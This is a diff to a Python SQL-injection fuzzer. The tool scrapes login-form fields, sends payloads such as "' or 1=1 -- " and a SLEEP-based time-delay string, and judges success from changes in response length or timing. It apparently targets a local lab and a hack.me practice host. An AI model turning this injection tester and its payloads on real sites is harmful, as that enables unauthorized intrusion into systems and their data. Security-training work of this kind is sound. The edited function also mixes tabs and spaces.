@@ -2,14 +2,17 @@ import requests
 from bs4 import BeautifulSoup
 import logging
 
+from fuzzer import get_odds_and_debug
+
 logging.basicConfig(filename="logs/fuzzer.log", level=logging.DEBUG)
-fuzzer_logger = logging.getLogger("Tester")
+tester_logger = logging.getLogger("Tester")
 
-# Payloads:
-#     Injection: SLEEP(1)/*' or SLEEP(1) or \'\" or SLEEP(5) or \"*/
-#     Error: \' OR 1=1
-#     Normal: asdfgh
+# Disable annoying debug logs from requests module
+logging.getLogger("urllib3").setLevel(logging.WARNING)
 
+CHECK_LOADTIME_NUM = 10
+time_to_load = 0.0
+odds_file, debug_mode = get_odds_and_debug()
 
 def get_input_fields(URL):
 	"""
@@ -28,6 +31,8 @@ def get_input_fields(URL):
 			fields.append(inpt["id"])
 		elif "name" in inpt.attrs:
 			fields.append(inpt["name"])
+		elif inpt.attrs["type"].lower() == "submit":
+			pass
 		else:
 			print("Can't handle this input tag:\n" + str(inpt))
 
@@ -52,6 +57,17 @@ def check_method(html):
     else:
         return form_tag["method"].lower()
 
+def check_loadtime(URL):
+	global time_to_load
+	if time_to_load != 0.0:
+		return time_to_load
+
+	time_avg = 0.0
+	for x in range(CHECK_LOADTIME_NUM):
+		item, tmp = get_info(URL)
+		time_avg += item
+	time_to_load = time_avg / CHECK_LOADTIME_NUM
+	return time_to_load
 
 def get_info(URL, s="abudy"):
     """
@@ -78,12 +94,11 @@ def get_info(URL, s="abudy"):
     else:
         print("Unknown method", method)
         return 0
-
     return r.elapsed.total_seconds(), len(r.text.split("\n"))
 
 
 def payload_check(URL, payload):
-    """
+	"""
     This is the proper wat to use this file.
     You give the funtion a url and a string, and the function checks
     whether or not the string has an impact on the site.
@@ -92,25 +107,26 @@ def payload_check(URL, payload):
     success - To alert that the string is working
     normal - to alert that there is no special impact on the site
     """
-    normal_time, normal_length = get_info(URL)
-    suspicious_time, suspicious_length = get_info(URL, payload)
+	normal_time, normal_length = get_info(URL)
+	suspicious_time, suspicious_length = get_info(URL, payload)
 
-    if normal_length != suspicious_length:
-        return "error"
+	loadtime = check_loadtime(URL)
+	print(loadtime)
+
+	tester_logger.debug("Normal Time: {}, Normal Length: {}".format(normal_time, normal_length))
+	tester_logger.debug("Suspicious Time: {}, Suspicious Length: {}".format(suspicious_time, suspicious_length))
+
+	if normal_length != suspicious_length:
+		return "error"
     # Check for ten times to get avarage load time
-    time_avg = 0.0
-    for x in range(10):
-        item, tmp = get_info(URL)
-        time_avg += item
-    time_avg = time_avg / 10
 
-    if suspicious_time > 3 * time_avg:
-        return "success"
+	if suspicious_time > 2 * time_to_load:
+		return "success"
 
-    return "normal"
+	return "normal"
 
 
 if __name__ == '__main__':
-	URL = "http://localhost/bricks/login-1/index.php"
-	payload = "SLEEP(1)/*' or SLEEP(1) or \'\" or SLEEP(1) or \"*/"
+	URL = "http://s130993-101229-fax.croto.hack.me/login.php"
+	payload = "\' or 1=1 -- "
 	print(payload_check(URL, payload))
